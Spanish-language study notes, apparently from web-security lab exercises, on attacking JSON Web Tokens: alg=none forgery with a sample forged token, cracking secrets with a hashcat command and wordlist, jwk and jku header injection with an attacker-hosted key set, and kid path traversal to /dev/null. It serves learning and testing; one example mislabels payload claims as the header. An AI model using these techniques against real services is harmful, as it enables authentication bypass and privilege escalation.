`jwt.io` es una web que ayuda con este tipo de ataques
## JWT format

Estos tokens se dividen en 3 partes :

1. Header
2. Payload
3. signature

Ejemeplo:

```JSON
eyJraWQiOiI5MTM2ZGRiMy1jYjBhLTRhMTktYTA3ZS1lYWRmNWE0NGM4YjUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTY0ODAzNzE2NCwibmFtZSI6IkNhcmxvcyBNb250b3lhIiwic3ViIjoiY2FybG9zIiwicm9sZSI6ImJsb2dfYXV0aG9yIiwiZW1haWwiOiJjYXJsb3NAY2FybG9zLW1vbnRveWEubmV0IiwiaWF0IjoxNTE2MjM5MDIyfQ.SYZBPIBg2CRjXAJ8vCER0LA_ENjII1JakvNQoP-Hw6GG1zfl4JyngsZReIfqRvIAEi5L4HV0q7_9qGhQZvy9ZdxEJbwTxRs_6Lb-fZTDpW6lKYNdMyjw45_alSCZ1fypsMWz_2mTpQzil0lOtps5Ei_z7mM7M8gCwe_AGpI53JxduQOaB5HkT5gVrv9cKu9CsW5MS6ZbqYXpGyOG5ehoxqm8DL5tFYaW3lB50ELxi0KsuTKEbD0t5BCl0aCR2MBJWAbN-xeLwEenaqBiwPVvKixYleeDQiBEIylFdNNIMviKRgXiYuAvMziVPbwSgkZVHeEdF5MQP1Oe2Spac-6IfA
```

### Header

El header no es más que objetos JSON encodeados en base64 y url, este header tiene metadata sobre el token, por ejemplo el header deljwt de arriba es : 

```JSON
{ 
	"iss": "portswigger",
	"exp": 1648037164, 
	"name": "Carlos Montoya", 
	"sub": "carlos", 
	"role": "blog_author", 
	"email": "carlos@carlos-montoya.net", 
	"iat": 1516239022 
}
```

### Signature

Normalmente el servidor genera una signature hasheando el header y el payload, en otros casos después de hacer esto cifran el hash correspondiente 

```
Nota: En la vida real no se suele usar JWT tal cual, si no JWS(JSON Web Signature) o JWE (JSON Web Encryption) que son derivados de JWT
```


## Exploiting flawed JWT signature verification

### Básico

Por defecto los servidores no suelen guardar información sobre los tokens JWT, si no que los propios tokens son los que guardan la información, por ende si el servidor no comprueba bien la firma del token un atacante puede modificar el JWT y hacerlo pasar por verdadero

Ejemplo:

```JSON
{ 
	"username": "carlos", 
	"isAdmin": false 
}
```


### Accepting arbitrary signatures

Hay veces que los developers al escribir el código usan la misma función para verificar y decodear el token, por ejemplo en Node.js si importas la librería `jsonwebtoken` tendrás las funciones `verify()` y `decode()` , si el developer se confunció y en vez de poner `verify()` puso `decode()`, la firma nunca será comprobada, esto admitirá cualquier tipo de firma en el token

### Accepting tokens with no signature

En el header siempre hay un campo llamado `alg` que le dice al servidor que algoritmo se usó para firmar el token y por ende cual tiene que usar para verificarlo

```JSON
{ 
	"alg": "HS256", 
	"typ": "JWT" 
}
```

Como esto está en la parte del usuario un atacante podría mandar un token que dijese que el JWT no está firmado, muchos servidores rechaazn este tipo de tokens, pero si está mal configurado un server podría aceptar algo así : 

```JSON
{ 
	"alg": "none", 
	"typ": "JWT" 
}
```


```
Nota: Para hacer este ataque habrá que poner none en alg y en el payload cambiar el usuario a administrator, además hay que eliminar toda la parte de la firma hasta el punto, ejemplo:

eyJraWQiOiI0ZWM4YzhmZi1hZDU1LTRkMTctODBhMC04ZjJiNTNhM2FjMzQiLCJhbGciOiJub25lIn0%3d.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc2NTEzNjEwNywic3ViIjoiYWRtaW5pc3RyYXRvciJ9.
```

## Brute-forcing secret keys

Wordlist: https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list 

Crackeamos el JWT con hashcat : 

```
hashcat -a 0 -m 16500 <jwt> <wordlist>
```


Una vez bruteforceado el secreto nos vamos a jwt.io en la parte de decoder, ponemos el secreto y los campos que queremos modificar 

<img width="1350" height="752" alt="image" src="https://github.com/user-attachments/assets/a038035e-6f46-4639-891d-b1032b89c8b7" />


## JWT header parameter injections

Otros parámetros que pueden tener los headers son : 

- `jwk` (JSON Web Key) - Provides an embedded JSON object representing the key.
 
- `jku` (JSON Web Key Set URL) - Provides a URL from which servers can fetch a set of keys containing the correct key.

- `kid` (Key ID) - Provides an ID that servers can use to identify the correct key in cases where there are multiple keys to choose from. Depending on the format of the key, this may have a matching `kid` parameter.
### jwk header

Imaginemos este header :

```JSON
{ 
	"kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG", 
	"typ": "JWT", 
	"alg": "RS256", 
	"jwk": { 
		"kty": "RSA", 
		"e": "AQAB", 
		"kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG", 
		"n": "yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9m"
	 } 
}
```

Idealmente un servidor solo usará una whitelist de public keys para verificar el token, pero a veces los servidores usan cualquier llave que esté embebida en el parámetro jwk 

1.

<img width="118" height="58" alt="image" src="https://github.com/user-attachments/assets/7c08c6c1-f47d-4ee6-b16f-a6e6c0eca6ad" />
2.
<img width="160" height="36" alt="image" src="https://github.com/user-attachments/assets/a3f6e750-2b21-41f5-95b9-9183cbeb35fe" />
3.Darle a generate y ok
<img width="512" height="543" alt="image" src="https://github.com/user-attachments/assets/7aa9f014-5016-41e4-8cf5-89395e515698" />
4.
<img width="92" height="25" alt="image" src="https://github.com/user-attachments/assets/1fedaad7-71b8-4a7e-b83c-6c7fc1fac14d" />
5.
<img width="476" height="52" alt="image" src="https://github.com/user-attachments/assets/bf3dc300-6e14-4aaa-b94e-241912231195" />
6.Attack ->embebed jwk
<img width="82" height="30" alt="image" src="https://github.com/user-attachments/assets/0ac9885b-e54e-4de3-b1ea-6a5c5115cc1d" />
7.ok
<img width="486" height="243" alt="image" src="https://github.com/user-attachments/assets/f9f0c0c4-2e07-4fbd-b15c-1aa39f0c70d6" />

Y así conseguimos un JWT token válido, todo esto con el usuario administrator cambiado en el payload

### jku header

A veces los jwt tokens están expuestos en directorios como `/.well-known/jwks.json`

1. En JWT Editor generamos una nueva llave RSA 
2. En nuestro servidor malicioso metemos este body :
```
{ 
	"keys": [
		 <RSA KEY>
	] 
}
```
2. Cambia el valor del parámetro kid de tu token al de la llave RSA generada
3. Añade un nuevo parámetro `jku` en el header y pon en el valor la url del servidor malicioso
4. En la extensión JSON Web Token pulsa "sign"
<img width="83" height="28" alt="image" src="https://github.com/user-attachments/assets/4bfe75a1-8d51-43c8-9c96-e7913c5a5a7d" />
5. pulsamos ok
<img width="493" height="370" alt="image" src="https://github.com/user-attachments/assets/71e39e30-56b5-42df-94b4-0dbb6d15da79" />

### kid header

Son vulnerables a path traversal para verificar la firma con un archivo:

```JSON
{ 
	"kid": "../../path/to/file", 
	"typ": "JWT", 
	"alg": "HS256", 
	"k": "asGsADas3421-dfh9DGN-AFDFDbasfd8-anfjkvc" 
}
```

Si hacemos path traversal a `/dev/null` entonces el token se firmará con un string vacío 

La symmetric key con la que firmemos el token se tiene que ver así en el campo k :

<img width="612" height="495" alt="image" src="https://github.com/user-attachments/assets/782e7848-9eff-4768-b097-010908a8d17d" />
Esto es porque AA== es un carácter nulo 
